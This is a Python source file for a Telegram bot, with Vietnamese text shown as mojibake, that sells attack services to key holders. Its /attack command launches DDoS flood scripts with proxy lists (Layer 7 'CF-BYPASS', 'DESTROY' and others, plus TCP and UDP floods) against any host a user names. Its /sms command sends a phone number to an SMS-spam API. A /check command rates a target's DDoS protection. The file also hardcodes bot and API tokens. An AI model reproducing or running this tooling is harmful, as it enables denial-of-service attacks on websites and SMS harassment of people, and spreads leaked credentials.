import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '6873604135:AAGH1Q5TbAlqo4IsjoXao5vp6yZt87cnHKI'

bot = telebot.TeleBot(bot_token)

allowed_group_id = -2044663638

allowed_users = []
processes = []
ADMIN_ID = 5362521832
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Chi D√†nh Cho Admin')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Nh·∫≠p ƒê√∫ng ƒê·ªãnh D·∫°ng /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'ƒê√£ Th√™m Ng∆∞·ªùi D√πng C√≥ ID L√†: {user_id} S·ª≠ D·ª•ng L·ªánh 30 Ng√†y')


load_users_from_database()

@bot.message_handler(commands=['getkey'])
def laykey(message):
    bot.reply_to(message, text='Vui L√≤ng Ch·ªù...')

    with open('key.txt', 'a') as f:
        f.close()

    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    key = str(hash_object.hexdigest())
    print(key)
    
    try:
        response = requests.get(f'https://web1s.com/api?token=02111506-4571-4103-89ba-d66203d759c0&url=https://anhgit.site/key?key={key}')
        response_json = response.json()
        if 'shortenedUrl' in response_json:
            url_key = response_json['shortenedUrl']
        else:
            url_key = "L·∫•y Key L·ªói Vui L√≤ng S·ª≠ D·ª•ng L·∫°i L·ªánh /getkey"
    except requests.exceptions.RequestException as e:
        url_key = "FL·∫•y Key L·ªói Vui L√≤ng S·ª≠ D·ª•ng L·∫°i L·ªánh /getkey"
    
    text = f'''
- C·∫£m ∆†n B·∫°n ƒê√£ Getkey -
- Link L·∫•y Key H√¥m Nay L√†: {url_key}
- Nh·∫≠p Key B·∫±ng L·ªánh /key + [key] -
 [L∆∞u √Ω: m·ªói key ch·ªâ c√≥ 1 ng∆∞·ªùi d√πng]
    '''
    bot.reply_to(message, text)

@bot.message_handler(commands=['key'])
def key(message):
    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Vui L√≤ng Nh·∫≠p Key\nV√≠ D·ª• /key gioiddos79667\nS·ª≠ D·ª•ng L·ªánh /getkey ƒê·ªÉ L·∫•y Key')
        return

    user_id = message.from_user.id

    key = message.text.split()[1]
    username = message.from_user.username
    string = f'GL-{username}+{TimeStamp()}'
    hash_object = hashlib.md5(string.encode())
    expected_key = str(hash_object.hexdigest())
    if key == expected_key:
        allowed_users.append(user_id)
        bot.reply_to(message, 'Nh·∫≠p Key Th√†nh C√¥ng')
    else:
        bot.reply_to(message, 'Key Sai Ho·∫∑c H·∫øt H·∫°n\nKh√¥ng S·ª≠ D·ª•ng Key C·ªßa Ng∆∞·ªùi Kh√°c!')


@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''
üìå T·∫•t C·∫£ C√°c L·ªánh:
1Ô∏è‚É£ L·ªánh L·∫•y Key V√† Nh·∫≠p Key
- /getkey : ƒê·ªÉ l·∫•y key
- /key + [Key] : K√≠ch Ho·∫°t Key
2Ô∏è‚É£ L·ªánh Spam 
- /sms + [S·ªë ƒêi·ªán Tho·∫°i] : Spam VIP
3Ô∏è‚É£ L·ªánh DDoS ( T·∫•n C√¥ng Website )
- /attack + [methods] + [host]
- /methods : ƒê·ªÉ Xem Methods
- /check + [host] : Ki·ªÉm Tra AntiDDoS
- /proxy : Check S·ªë L∆∞·ª£ng Proxy
4Ô∏è‚É£ L·ªánh C√≥ √çch ^^
- /code + [host] : L·∫•y Source Code Website
- /getproxy : Proxy S·∫Ω T·ª± ƒê·ªông Update Sau 10 Ph√∫t
[ Proxy Live 95% Die 5 % ]
- /time : S·ªë Th·ªùi Gian Bot Ho·∫°t ƒê·ªông
5Ô∏è‚É£ Info Admin
- /muakey : ƒê·ªÉ Mua Key VIP
- /admin : Info Admin
- /on : On Bot
- /off : Off Bot
'''
    bot.reply_to(message, help_text)
    
is_bot_active = True
@bot.message_handler(commands=['sms'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hi·ªán ƒëang t·∫Øt. Vui l√≤ng ch·ªù khi n√†o ƒë∆∞·ª£c b·∫≠t l·∫°i.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui l√≤ng nh·∫≠p Key\nS·ª≠ d·ª•ng l·ªánh /getkey ƒë·ªÉ l·∫•y Key')
        return

    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Vui l√≤ng nh·∫≠p ƒë√∫ng c√∫ ph√°p.\nV√≠ d·ª•: /sms + [s·ªë ƒëi·ªán tho·∫°i]')
        return

    username = message.from_user.username

    args = message.text.split()
    phone_number = args[1]

    blocked_numbers = ['113', '114', '115', '198', '911', '0376349783']
    if phone_number in blocked_numbers:
        bot.reply_to(message, 'B·∫°n kh√¥ng ƒë∆∞·ª£c spam s·ªë n√†y.')
        return

    if user_id in cooldown_dict and time.time() - cooldown_dict[user_id] < 90:
        remaining_time = int(90 - (time.time() - cooldown_dict[user_id]))
        bot.reply_to(message, f'Vui l√≤ng ƒë·ª£i {remaining_time} gi√¢y tr∆∞·ªõc khi ti·∫øp t·ª•c s·ª≠ d·ª•ng l·ªánh n√†y.')
        return
    
    cooldown_dict[user_id] = time.time()

    username = message.from_user.username

    bot.reply_to(message, f'@{username} ƒêang Ti·∫øn H√†nh Spam')

    args = message.text.split()
    phone_number = args[1]

    # G·ª≠i d·ªØ li·ªáu t·ªõi api
    url = f"https://api.viduchung.info/spam-sms/?phone={phone_number}"
    response = requests.get(url)

    bot.reply_to(message, f'‚îè‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îì\n‚îÉ   Spam Th√†nh C√¥ng!!!\n‚îó‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚û§\n‚îè‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îì\n‚î£‚û§ Attack By: @{username} \n‚î£‚û§ S·ªë T·∫•n C√¥ng: {phone_number} \n‚î£‚û§ Group: @botgioitool \n‚îó‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚û§')
@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
üìå T·∫•t C·∫£ Methods:
üöÄ Layer7 
[ Kh√¥ng Gov, Edu ]
TLS
DESTROY
CF-BYPASS
[ ƒê∆∞·ª£c Pem Gov, Edu]
GOD 
üöÄ Layer4
TCP-FLOOD
UDP-FLOOD
'''
    bot.reply_to(message, help_text)

allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "ƒê√£ D·ª´ng L·ªánh T·∫•n C√¥ng, C·∫£m ∆†n B·∫°n ƒê√£ S·ª≠ D·ª•ng")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hi·ªán ƒëang t·∫Øt. Vui l√≤ng ch·ªù khi n√†o ƒë∆∞·ª£c b·∫≠t l·∫°i.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui l√≤ng nh·∫≠p Key\nS·ª≠ d·ª•ng l·ªánh /getkey ƒë·ªÉ l·∫•y Key')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Vui l√≤ng nh·∫≠p ƒë√∫ng c√∫ ph√°p.\nV√≠ d·ª•: /attack + [method] + [host]')
        return

    username = message.from_user.username

    current_time = time.time()
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} Vui l√≤ng ƒë·ª£i {remaining_time} gi√¢y tr∆∞·ªõc khi s·ª≠ d·ª•ng l·∫°i l·ªánh /attack.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    if method in ['UDP-FLOOD', 'TCP-FLOOD'] and len(args) < 4:
        bot.reply_to(message, f'Vui l√≤ng nh·∫≠p c·∫£ port.\nV√≠ d·ª•: /attack {method} {host} [port]')
        return

    if method in ['UDP-FLOOD', 'TCP-FLOOD']:
        port = args[3]
    else:
        port = None

    blocked_domains = [".edu.vn", ".gov.vn", "chinhphu.vn"]   
    if method == 'TLS' or method == 'DESTROY' or method == 'CF-BYPASS':
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"Kh√¥ng ƒë∆∞·ª£c ph√©p t·∫•n c√¥ng trang web c√≥ t√™n mi·ªÅn {blocked_domain}")
                return

    if method in ['TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD']:
        # Update the command and duration based on the selected method
        if method == 'TLS':
            command = ["node", "TLS.js", host, "90", "64", "5"]
            duration = 90
        elif method == 'GOD':
            command = ["node", "GOD.js", host, "45", "64", "3"]
            duration = 45
        elif method == 'DESTROY':
            command = ["node", "DESTROY.js", host, "90", "64", "5", "proxy.txt"]
            duration = 90
        elif method == 'CF-BYPASS':
            command = ["node", "CFBYPASS.js", host, "90", "64", "5", "proxy.txt"]
            duration = 90
        elif method == 'UDP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port ph·∫£i l√† m·ªôt s·ªë nguy√™n d∆∞∆°ng.')
                return
            command = ["python", "udp.py", host, port, "90", "64", "10"]
            duration = 90
        elif method == 'TCP-FLOOD':
            if not port.isdigit():
                bot.reply_to(message, 'Port ph·∫£i l√† m·ªôt s·ªë nguy√™n d∆∞∆°ng.')
                return
            command = ["python", "tcp.py", host, port, "90", "64", "10"]
            duration = 90

        cooldown_dict[username] = {'attack': current_time}

        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        bot.reply_to(message, f'‚îè‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îì\n‚îÉ   Successful Attack!!!\n‚îó‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚û§\n‚îè‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îì\n‚î£‚û§ Attack By: @{username} \n‚î£‚û§ Host: {host} \n‚î£‚û§ Methods: {method} \n‚î£‚û§ Time: {duration} Gi√¢y\n‚î£‚û§ Group: @botgioitool \n‚îó‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚û§')
    else:
        bot.reply_to(message, 'Ph∆∞∆°ng th·ª©c t·∫•n c√¥ng kh√¥ng h·ª£p l·ªá. S·ª≠ d·ª•ng l·ªánh /methods ƒë·ªÉ xem ph∆∞∆°ng th·ª©c t·∫•n c√¥ng')

@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if user_id in allowed_users:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                bot.reply_to(message, f"S·ªë l∆∞·ª£ng proxy: {num_proxies}")
        except FileNotFoundError:
            bot.reply_to(message, "Kh√¥ng t√¨m th·∫•y file proxy.txt.")
    else:
        bot.reply_to(message, 'B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.')

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f"S·ªë proxy m·ªõi update l√†: {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Wait for 10 minutes

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'üñ•Ô∏è CPU Usage: {cpu_usage}%\nüíæ Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'Bot ƒë√£ ƒë∆∞·ª£c t·∫Øt. T·∫•t c·∫£ ng∆∞·ªùi d√πng kh√¥ng th·ªÉ s·ª≠ d·ª•ng l·ªánh kh√°c.')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'B·∫°n kh√¥ng c√≥ quy·ªÅn s·ª≠ d·ª•ng l·ªánh n√†y.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'Bot ƒë√£ ƒë∆∞·ª£c kh·ªüi ƒë·ªông l·∫°i. T·∫•t c·∫£ ng∆∞·ªùi d√πng c√≥ th·ªÉ s·ª≠ d·ª•ng l·∫°i l·ªánh b√¨nh th∆∞·ªùng.')

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hi·ªán ƒëang t·∫Øt. Vui l√≤ng ch·ªù khi n√†o ƒë∆∞·ª£c b·∫≠t l·∫°i.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui l√≤ng nh·∫≠p Key\nS·ª≠ d·ª•ng l·ªánh /getkey ƒë·ªÉ l·∫•y Key')
        return
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui l√≤ng nh·∫≠p ƒë√∫ng c√∫ ph√°p.\nV√≠ d·ª•: /code + [link website]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'Kh√¥ng th·ªÉ l·∫•y m√£ ngu·ªìn t·ª´ trang web n√†y. Vui l√≤ng ki·ªÉm tra l·∫°i URL.')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'Trang web kh√¥ng ph·∫£i l√† HTML ho·∫∑c PHP. Vui l√≤ng th·ª≠ v·ªõi URL trang web ch·ª©a file HTML ho·∫∑c PHP.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_document')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'C√≥ l·ªói x·∫£y ra: {str(e)}')

@bot.message_handler(commands=['check'])
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Vui l√≤ng nh·∫≠p ƒë√∫ng c√∫ ph√°p.\nV√≠ d·ª•: /check + [link website]')
        return

    url = message.text.split()[1]
    
    # Ki·ªÉm tra xem URL c√≥ http/https ch∆∞a, n·∫øu ch∆∞a th√™m v√†o
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Lo·∫°i b·ªè ti·ªÅn t·ªë "www" n·∫øu c√≥
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"Ip c·ªßa website: {url}\nL√†: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Website c√≥ 1 ip c√≥ kh·∫£ nƒÉng kh√¥ng antiddos."
        else:
            reply += "Website c√≥ nhi·ªÅu h∆°n 1 ip kh·∫£ nƒÉng antiddos r·∫•t cao.\nKh√¥ng th·ªÉ t·∫•n c√¥ng website n√†y."

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"C√≥ l·ªói x·∫£y ra: {str(e)}")

@bot.message_handler(commands=['admin'])
def send_admin_link(message):
    bot.reply_to(message, "Telegram: t.me/gioihocdev")
@bot.message_handler(commands=['sms'])
def sms(message):
    pass


# H√†m t√≠nh th·ªùi gian ho·∫°t ƒë·ªông c·ªßa bot
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'Bot hi·ªán ƒëang t·∫Øt. Vui l√≤ng ch·ªù khi n√†o ƒë∆∞·ª£c b·∫≠t l·∫°i.')
        return
    
    if user_id not in allowed_users:
        bot.reply_to(message, text='Vui l√≤ng nh·∫≠p Key\nS·ª≠ d·ª•ng l·ªánh /getkey ƒë·ªÉ l·∫•y Key')
        return

    try:
        with open("proxybynhakhoahoc.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Ph√∫t T·ª± Update\nS·ªë l∆∞·ª£ng proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxybynhakhoahoc.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Kh√¥ng t√¨m th·∫•y file proxy.txt.")


@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} gi·ªù, {minutes} ph√∫t, {seconds} gi√¢y'
    bot.reply_to(message, f'Bot ƒê√£ Ho·∫°t ƒê·ªông ƒê∆∞·ª£c: {uptime_str}')


@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'L·ªánh kh√¥ng h·ª£p l·ªá. Vui l√≤ng s·ª≠ d·ª•ng l·ªánh /help ƒë·ªÉ xem danh s√°ch l·ªánh.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
